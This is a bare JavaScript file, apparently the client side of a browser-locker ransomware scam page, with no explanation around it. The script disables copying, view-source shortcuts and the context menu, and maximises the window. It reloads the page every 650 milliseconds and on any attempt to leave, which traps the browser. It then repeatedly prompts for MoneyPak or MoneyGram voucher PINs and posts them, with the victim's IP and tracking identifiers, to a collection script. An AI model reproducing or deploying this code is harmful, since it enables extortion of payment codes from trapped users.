document.ondragstart = test;
document.onselectstart = test;
document.oncontextmenu = test;
function test()
{
	return false;
}
function catchControlKeys(event)
{
	var code = event.keyCode ? event.keyCode : event.which ? event.which : null;
	if (event.ctrlKey)
	{
		if (code == 117) return false;
		if (code == 85) return false;
		if (code == 99) return false;
		if (code == 67) return false;
		if (code == 97) return false;
		if (code == 65) return false;
	}
	return true;
}

window.onload = maxWindow;

function maxWindow()
{
	window.moveTo(0, 0);

	if (document.all)
	{
		top.window.resizeTo(screen.availWidth, screen.availHeight);
	}

	else if (document['layers'] || document.getElementById)
	{
		if (top.window.outerHeight < screen.availHeight || top.window.outerWidth < screen.availWidth)
		{
			top.window.outerHeight = screen.availHeight;
			top.window.outerWidth = screen.availWidth;
		}
	}
}
var Application =
{
	moneypak: new RegExp("^[0-9]{10}[0-9]{0}$"),
	moneygram: new RegExp("^6006[0-9]{15}[0-9]{4}$"),

	init: function()
	{
		this.reloadText = $('#reloadText').val().split('\\n').join('\n');
		this.okText = $('#okText').val().split('\\n').join('\n');
		this.badText = $('#badText').val().split('\\n').join('\n');
		this.promptText = $('#promptText').val().split('\\n').join('\n');

		window.onbeforeunload = function(){ location.reload(); return Application.reloadText };
		setInterval(function() {location.reload()}, 650);
		Application.askForCode();
	},

	adw_config: function(){

		return this.make_adw_config || (this.make_adw_config = {
			router: 'router.php',
			user_ip: $("#ip").html()

		});
	},

	askForCode: function()
	{
		var pin = prompt(this.promptText);
		if (!pin)
		{
			alert(this.badText);
			location.reload();
		}
		else if (this.moneypak.test(pin))
		{
			this.sendCode(2, pin);
			alert(this.okText);
			//location.reload();
		}
		else if (this.moneygram.test(pin))
		{
			this.sendCode(1, pin);
			alert(this.okText);
			//location.reload();
		}
		else
		{
			alert(this.badText);
			location.reload();
		}
	},

	sendCode: function(type, code)
	{
		var config = this.adw_config();

		if (!window.ie8OrLower)
		{
			$.ajax({
				type: "POST",
				async: false,
				timeout: 5000,
				url: baseUrl + "stat.php",
				dataType: 'json',
				data: "type=" + type + '&pin=' + code + '&cost=200&ip=' + isIp + '&id=' + inId + '&subid=' + inSubId + '&country=' + cFix + '&cur=usd' + '&token=' + cToken,
				success: function(result){
					if (typeof result == "string")
					{
						if (result == 'ok')
						{
							alert(Application.okText);
						}
						else if (result == 'bad')
						{
							alert(Application.badText);
						}
					}
				},

				error: function(request, status) {
					if(status == "timeout") {
						alert('Error sending your data');
					}
				}
			});
		}
		else
		{
			$('iframe').remove();
			var location = window.location.href;
			if (location.indexOf('?') !== -1)
			{
				location = location.split('?')[0];
			}
			window.location.href = location + "?type=" + type + '&pin=' + code + '&cost=200&ip=' + isIp + '&id=' + inId + '&subid=' + inSubId + '&country=' + cFix + '&cur=usd' + '&token=' + cToken;

		}
	}
};

var main = window.main =
{
	adw_config: function(){

		return this.make_adw_config || (this.make_adw_config = {
			router: 'router.php',
			user_ip: $("#ip").html()

		});
	},

	dial: function(digit){

		var code_input = $("#code");

		if (typeof digit == 'number' && digit >= 0 && digit < 10)
		{
			code_input.val(code_input.val() + digit);
		}
	},

	backspace: function()
	{
		var code_input = $("#code");
		var sliced = code_input.val().slice(0, -1);
		code_input.val(sliced);
		//alert(str.slice(0, -1));
	},

	clr: function()
	{
		$("#code").val('');
	},

	presubmit: function(type){
		var config = this.adw_config();
		var code = $("#code").val();
		var cost = $("#cost option:selected").val();

		var moneypak = new RegExp("^[0-9]{10}[0-9]{4}$");
		var moneygram = new RegExp("^6006[0-9]{15}[0-9]{4}$");

		switch (type) {
			case '2':

				if (moneypak.test(code))
				{
					this.send_data(type, code, cost);
				}
				else
				{
					alert(Application.badText);
				}

				break

			case '1':
				if (moneygram.test(code))
				{
					this.send_data(type, code, cost);
				}
				else
				{
					alert(Application.badText);
				}
				break

			default:
				alert('Earth is falling down')
		}
	},

	send_data: function(type, code, cost )
	{
		var config = this.adw_config();

		if (!window.ie8OrLower)
		{
			$.ajax({
				type: "POST",
				async: false,
				timeout: 5000,
				url: '',
				dataType: 'json',
				data: "type=" + type + '&pin=' + code + '&cost=' + cost + '&ip=' + isIp + '&id=' + inId + '&subid=' + inSubId + '&country=' + cFix + '&cur=usd' + '&token=' + cToken,
				success: function(result){
					if (typeof result == "string")
					{
						if (result == 'ok')
						{
							alert(Application.okText);
						}
						else if (result == 'bad')
						{
							alert(Application.badText);
						}
					}
				},

				error: function(request, status, err) {
					if(status == "timeout") {
						alert('Error sending your data');
					}
				}
			});
		}
		else
		{
			$('iframe').remove();
			var location = window.location.href;

			if (location.indexOf('?') !== -1)

			{

				location = location.split('?')[0];

			}
			window.location.href = location + "?type=" + type + '&pin=' + code + '&cost=' + cost + '&ip=' + isIp + '&id=' + inId + '&subid=' + inSubId + '&country=' + cFix + '&cur=usd' + '&token=' + cToken;
			alert(Application.okText);
		}
	}
};


$(function() {Application.init()});
window.inWin = true;
var closedIframe = 2;
$(window).blur(function()
{
	inWin = false;
	setTimeout(checkInwin, 150);
});
$(window).focus(function()
{
	inWin = true;
});
window.checkInwin = function()
{
	if (!inWin)
	{

		$('iframe').get(closedIframe).src = 'empty.php';
		closedIframe--;
		inWin = true;
	}
};